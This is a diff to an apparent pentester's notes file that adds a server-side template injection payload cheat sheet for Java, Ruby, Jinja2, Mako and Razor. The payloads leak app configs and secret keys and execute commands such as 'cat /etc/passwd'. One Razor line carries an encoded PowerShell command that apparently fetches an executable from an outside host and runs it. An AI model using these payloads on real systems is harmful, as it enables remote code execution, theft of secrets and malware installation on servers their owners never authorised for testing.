@@ -67,5 +67,78 @@ nmap -Pn -n --top-ports 5000 13.40.217.134 -sV -sC --version-all --script=vuln -
 ```
 https://github.com/reddelexc/hackerone-reports
 ```
+____________________________
+## SSTI 
+```
+java
+${7*7}
+${{7*7}}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
+```
+```
+Ruby
+{ 7 * 7 }
+{ %x|env| }
+Jinja2 Python
+{{7*7}} = Error
+${7*7} = ${7*7}
+{{foobar}} Nothing
+{{4*4}}[[5*5]]
+{{7*'7'}} = 7777777
+{{config}}
+{{config.items()}}
+{{settings.SECRET_KEY}}
+{{settings}}
+<div data-gb-custom-block data-tag="debug"></div>
+```
+
+```
+Moka Python
+<%
+import os
+x=os.popen('id').read()
+%>
+${x}
+```
+
+```
+Razor (.Net)
+@(2+2) <= Success
+@() <= Success
+@("{{code}}") <= Success
+@ <=Success
+@{} <= ERROR!
+@{ <= ERRROR!
+@(1+2)
+@( //C#Code )
+@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");
+@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAYQBzAGsAcwBcAHQAZQBzAHQAbQBlAHQANgA0AC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");
+```
+# ssti payloads
+```
+{{2*2}}[[3*3]]
+{{3*3}}
+{{3*'3'}}
+<%= 3 * 3 %>
+${6*6}
+${{3*3}}
+@(6+5)
+#{3*3}
+#{ 3 * 3 }
+*{7*7}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+{{config.items()}}
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}
+{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
+{{'a'.toUpperCase()}} 
+{{ request }}
+{{self}}
+```
 
 
